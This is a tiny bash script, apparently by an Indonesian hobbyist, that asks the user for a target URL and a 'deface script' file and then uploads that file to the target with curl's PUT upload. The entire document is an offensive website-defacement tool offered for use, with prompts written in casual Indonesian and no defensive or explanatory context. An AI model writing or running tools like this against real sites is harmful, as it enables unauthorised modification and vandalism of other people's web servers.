#!/bin/bash
#Codec By altino

echo "Masukan Target lu : "
read target
sleep 1
echo "Input Script Deface lu : "
read file
sleep 1
echo "tunggu..."
sleep 2
curl -T /sdcard/$file $target
